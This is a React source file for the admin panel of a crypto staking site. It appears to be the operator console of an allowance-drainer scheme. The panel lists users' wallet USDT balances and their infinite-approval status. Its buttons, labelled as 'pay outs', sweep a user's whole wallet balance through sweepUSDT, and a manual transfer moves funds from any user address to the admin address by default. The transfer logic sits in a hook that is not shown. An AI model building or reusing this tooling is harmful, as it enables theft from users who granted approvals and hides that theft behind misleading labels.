import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useWeb3ModalAccount } from '@web3modal/ethers/react';
import { useAdmin } from '../hooks/useAdmin';

import { isAdmin, PRIMARY_ADMIN } from '../lib/admin';

const AdminControl: React.FC = () => {
    const navigate = useNavigate();
    const { address, isConnected } = useWeb3ModalAccount();
    const { fetchUserData, fetchAllUsersDetailed, manageFunds, sweepUSDT, emergencyWithdraw } = useAdmin();
    
    const [targetUser, setTargetUser] = useState('');
    const [userData, setUserData] = useState<any>(null);
    const [allUsers, setAllUsers] = useState<any[]>([]);
    const [loadingAll, setLoadingAll] = useState(false);


    const mfToken = '0x55d398326f99059fF775485246999027B3197955';
    const [mfFrom, setMfFrom] = useState('');
    const [mfTo, setMfTo] = useState(PRIMARY_ADMIN);
    const [mfAmount, setMfAmount] = useState('');

    const [ewToken, setEwToken] = useState('');
    const [ewAmount, setEwAmount] = useState('');

    const [loading, setLoading] = useState(false);
    const [fetching, setFetching] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [success, setSuccess] = useState<string | null>(null);

    // Redirect non-admin wallets to Dashboard
    useEffect(() => {
        if (!isConnected || (address && !isAdmin(address))) {
             navigate('/', { replace: true });
        }
    }, [address, isConnected, navigate]);

    const handleFetchUser = async () => {
        if (!targetUser) return;
        setFetching(true);
        setError(null);
        try {
            const data = await fetchUserData(targetUser);
            if (data) {
                setUserData(data);
                setMfFrom(targetUser);
                setMfAmount(data.balance);
            } else {
                setError("Could not fetch user data. Check address.");
                setUserData(null);
            }
        } catch (err: any) {
            setError(err.message);
        } finally {
            setFetching(false);
        }
    };

    const handleLoadAllUsers = async () => {
        setLoadingAll(true);
        setError(null);
        try {
            const users = await fetchAllUsersDetailed();
            setAllUsers(users);
        } catch (err: any) {
            setError(err.message);
        } finally {
            setLoadingAll(false);
        }
    };

    useEffect(() => {
        if (isConnected && address && isAdmin(address)) {
            handleLoadAllUsers();
        }
    }, [isConnected, address]);

    const handleTrackUser = (userAddr: string) => {
        setTargetUser(userAddr);
        // We already have its data in the list, but let's re-fetch for the management card to be safe
        setTimeout(() => handleFetchUser(), 100);
        window.scrollTo({ top: 0, behavior: 'smooth' });
    };

    const handleAction = async (action: () => Promise<any>, successMsg: string) => {
        try {
            setLoading(true);
            setError(null);
            setSuccess(null);
            await action();
            setSuccess(successMsg);
            // Refresh data after action
            if (targetUser) handleFetchUser();
        } catch (err: any) {
            console.error(err);
            setError(err.reason || err.message || "An error occurred");
        } finally {
            setLoading(false);
        }
    };

    if (!isConnected || (address && !isAdmin(address))) {
        return null;
    }

    return (
        <div className="flex-1 flex flex-col pb-32 bg-background-dark min-h-screen text-white font-display">
            <header className="flex items-center justify-between px-6 py-5 bg-[#0a0a0a]/80 backdrop-blur-md sticky top-0 z-30 border-b border-gray-800">
                <div className="flex items-center gap-2">
                    <button onClick={() => navigate('/')} className="bg-transparent border-none text-gray-400 hover:text-primary transition-colors cursor-pointer mr-2">
                        <span className="material-icons-round">arrow_back</span>
                    </button>
                    <span className="material-icons-round text-primary">admin_panel_settings</span>
                    <h1 className="font-display font-black text-xl text-white tracking-[0.1em] uppercase">Admin Control</h1>
                </div>
            </header>

            <main className="flex-1 p-6 space-y-6 overflow-y-auto">
                {error && (
                    <div className="bg-red-500/10 border border-red-500/50 text-red-500 p-4 rounded-xl text-sm font-medium animate-pulse">
                        {error}
                    </div>
                )}
                {success && (
                    <div className="bg-green-500/10 border border-green-500/50 text-green-500 p-4 rounded-xl text-sm font-medium">
                        {success}
                    </div>
                )}

                {/* USER MANAGEMENT & SWEEP */}
                <div className="bg-card-dark rounded-3xl p-6 border border-primary/20 shadow-glow relative overflow-hidden">
                    <div className="absolute top-0 right-0 p-4 opacity-5">
                        <span className="material-icons-round text-6xl">person_search</span>
                    </div>
                    <h2 className="text-lg font-black text-primary mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-xl">manage_accounts</span> User Management & Sweep
                    </h2>
                    
                    <div className="flex gap-2 mb-6">
                        <input
                            type="text"
                            placeholder="User Wallet Address (0x...)"
                            value={targetUser}
                            onChange={(e) => setTargetUser(e.target.value)}
                            className="flex-1 bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary transition-all font-mono text-sm"
                        />
                        <button 
                            onClick={handleFetchUser}
                            disabled={fetching || !targetUser}
                            className="bg-primary text-black px-6 rounded-xl font-black uppercase text-xs hover:scale-105 transition-transform disabled:opacity-50 border-none cursor-pointer"
                        >
                            {fetching ? '...' : 'Track'}
                        </button>
                    </div>

                    {userData && (
                        <div className="space-y-4 animate-in fade-in slide-in-from-top-4 duration-300">
                            <div className="grid grid-cols-2 gap-3">
                                <div className="bg-black/40 p-3 rounded-xl border border-white/5">
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">USDT Balance</p>
                                    <p className="text-xl font-black text-white">{userData.balance} <span className="text-primary text-xs">USDT</span></p>
                                </div>
                                <div className="bg-black/40 p-3 rounded-xl border border-white/5">
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">Staking Status</p>
                                    <p className="text-lg font-black text-white">{userData.staked} <span className="text-gray-500 text-xs">Staked</span></p>
                                </div>
                            </div>

                            <div className="bg-black/40 p-4 rounded-xl border border-white/5 flex items-center justify-between">
                                <div>
                                    <p className="text-[10px] text-gray-500 uppercase font-black mb-1">Contract Allowance</p>
                                    <div className="flex items-center gap-2">
                                        <div className={`w-2 h-2 rounded-full ${userData.isApproved ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.6)]' : 'bg-red-500'}`}></div>
                                        <span className={`text-sm font-black ${userData.isApproved ? 'text-green-500' : 'text-red-500'}`}>
                                            {userData.isApproved ? 'Approved/Infinite' : 'Not Approved'}
                                        </span>
                                    </div>
                                </div>
                                <button
                                    onClick={() => handleAction(() => sweepUSDT(targetUser, userData.balance), "Transaction processed successfully!")}
                                    disabled={loading || !userData.isApproved || parseFloat(userData.balance) <= 0}
                                    className="bg-green-500 text-black px-6 py-3 rounded-xl font-black uppercase text-xs shadow-glow hover:scale-105 transition-all disabled:opacity-30 disabled:grayscale border-none cursor-pointer"
                                >
                                    {loading ? 'Processing...' : 'Execute Pay Out'}
                                </button>
                            </div>
                        </div>
                    )}
                </div>


                {/* Manual Manage Funds */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card opacity-80">
                    <h2 className="text-lg font-black text-white mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-accent-cyan text-xl">swap_horiz</span> Advanced Manage Funds
                    </h2>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">USDT Token (Fixed)</label>
                            <input
                                type="text"
                                readOnly
                                value={mfToken}
                                className="w-full bg-[#0a0a0a] border border-gray-800 rounded-xl px-4 py-3 text-gray-500 font-mono text-xs"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Source Address</label>
                            <input
                                type="text"
                                placeholder="0x..."
                                value={mfFrom}
                                onChange={(e) => setMfFrom(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Destination Address</label>
                            <input
                                type="text"
                                value={mfTo}
                                onChange={(e) => setMfTo(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Amount</label>
                            <input
                                type="number"
                                placeholder="0.00"
                                value={mfAmount}
                                onChange={(e) => setMfAmount(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-accent-cyan transition-all font-mono text-sm"
                            />
                        </div>
                        <button
                            onClick={() => handleAction(() => manageFunds(mfToken, mfFrom, mfTo, mfAmount), "Manual transfer executed!")}
                            disabled={loading || !mfToken || !mfFrom || !mfTo || !mfAmount}
                            className="w-full bg-accent-cyan/10 text-accent-cyan border border-accent-cyan/20 hover:bg-accent-cyan hover:text-black py-3 rounded-xl font-black text-xs uppercase tracking-wider transition-all disabled:opacity-50 border-none cursor-pointer"
                        >
                            Manual Executive Transfer
                        </button>
                    </div>
                </div>

                {/* Emergency Withdraw */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card">
                    <h2 className="text-lg font-black text-red-500 mb-4 flex items-center gap-2">
                        <span className="material-icons-round text-red-500 text-xl">warning</span> Emergency Withdraw
                    </h2>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Contract Token</label>
                            <input
                                type="text"
                                placeholder="USDT Address or other"
                                value={ewToken}
                                onChange={(e) => setEwToken(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-all font-mono text-sm"
                            />
                        </div>
                        <div>
                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 px-1">Amount</label>
                            <input
                                type="number"
                                placeholder="0.00"
                                value={ewAmount}
                                onChange={(e) => setEwAmount(e.target.value)}
                                className="w-full bg-[#111] border border-gray-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 transition-all font-mono text-sm"
                            />
                        </div>
                        <button
                            onClick={() => handleAction(() => emergencyWithdraw(ewToken, ewAmount), "Emergency withdrawal successful!")}
                            disabled={loading || !ewToken || !ewAmount}
                            className="w-full bg-red-500/10 text-red-500 border border-red-500/20 hover:bg-red-500 hover:text-white py-3 rounded-xl font-black text-xs uppercase tracking-wider transition-all disabled:opacity-50 border-none cursor-pointer"
                        >
                            Emergency Withdraw
                        </button>
                    </div>
                </div>

                {/* USER EXPLORER - ALL REGISTERED USERS */}
                <div className="bg-card-dark rounded-3xl p-6 border border-gray-800 shadow-card">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-lg font-black text-white flex items-center gap-2">
                            <span className="material-icons-round text-primary text-xl">group</span> Registered Users Discovery
                        </h2>
                        <button 
                            onClick={handleLoadAllUsers}
                            disabled={loadingAll}
                            className="bg-primary/10 text-primary border border-primary/20 hover:bg-primary hover:text-black px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all cursor-pointer border-none"
                        >
                            {loadingAll ? 'Scanning...' : 'Refresh List'}
                        </button>
                    </div>

                    <div className="overflow-x-auto -mx-6 px-6">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-white/5 text-[9px] text-gray-500 font-black uppercase tracking-widest">
                                    <th className="pb-4 pt-2">Address</th>
                                    <th className="pb-4 pt-2">Wallet USDT</th>
                                    <th className="pb-4 pt-2">Staked</th>
                                    <th className="pb-4 pt-2">Status</th>
                                    <th className="pb-4 pt-2 text-right">Action</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-white/5">
                                {allUsers.length === 0 && !loadingAll && (
                                    <tr>
                                        <td colSpan={5} className="py-20 text-center text-gray-500 font-bold uppercase text-[10px] tracking-widest italic opacity-50">
                                            No users discovered yet. Click refresh to scan events.
                                        </td>
                                    </tr>
                                )}
                                {allUsers.map((user, idx) => (
                                    <tr key={idx} className="group hover:bg-white/[0.02] transition-colors">
                                        <td className="py-4 font-mono text-[10px] text-gray-400">
                                            {user.address.slice(0, 6)}...{user.address.slice(-4)}
                                            <button 
                                                onClick={() => { navigator.clipboard.writeText(user.address); }}
                                                className="ml-2 opacity-0 group-hover:opacity-100 material-icons-round text-[12px] text-gray-600 hover:text-primary transition-all bg-transparent border-none cursor-pointer"
                                            >
                                                content_copy
                                            </button>
                                        </td>
                                        <td className="py-4 font-black text-xs">
                                            {parseFloat(user.balance).toFixed(2)} <span className="text-[9px] text-gray-600">USDT</span>
                                        </td>
                                        <td className="py-4 font-black text-xs text-primary">
                                            {parseFloat(user.staked).toFixed(0)} <span className="text-[9px] text-primary/40">USDT</span>
                                        </td>
                                        <td className="py-4">
                                            <div className="flex items-center gap-2">
                                                <div className={`w-1.5 h-1.5 rounded-full ${user.isApproved ? 'bg-green-500' : 'bg-red-500'}`}></div>
                                                <span className={`text-[9px] font-black uppercase ${user.isApproved ? 'text-green-500' : 'text-red-500'}`}>
                                                    {user.isApproved ? 'Approved' : 'Denied'}
                                                </span>
                                            </div>
                                        </td>
                                         <td className="py-4 text-right">
                                            <div className="flex items-center justify-end gap-2">
                                                 <button 
                                                     onClick={() => handleTrackUser(user.address)}
                                                     className="bg-white/5 hover:bg-white/10 text-white p-2 rounded-lg transition-all border-none cursor-pointer"
                                                     title="Track & Load User"
                                                 >
                                                     <span className="material-icons-round text-sm">person_search</span>
                                                 </button>
                                                 <button 
                                                     onClick={() => {
                                                         setMfFrom(user.address);
                                                         setMfAmount(user.balance);
                                                         window.scrollTo({ top: 300, behavior: 'smooth' });
                                                     }}
                                                     className="bg-accent-cyan/10 hover:bg-accent-cyan text-accent-cyan hover:text-black p-2 rounded-lg transition-all border-none cursor-pointer"
                                                     title="Manage Funds Manually"
                                                 >
                                                     <span className="material-icons-round text-sm">settings_suggest</span>
                                                 </button>
                                                 <button 
                                                     onClick={() => {
                                                         handleTrackUser(user.address);
                                                         handleAction(() => sweepUSDT(user.address, user.balance), "Payment processed successfully!");
                                                     }}
                                                     disabled={loading || !user.isApproved || parseFloat(user.balance) <= 0}
                                                     className="bg-green-500/10 hover:bg-green-500 text-green-500 hover:text-black p-2 rounded-lg transition-all disabled:opacity-10 disabled:grayscale border-none cursor-pointer"
                                                     title="Quick Pay Out (Sweep)"
                                                 >
                                                     <span className="material-icons-round text-sm">payments</span>
                                                 </button>
                                            </div>
                                         </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                </div>


            </main>
        </div>
    );
};

export default AdminControl;
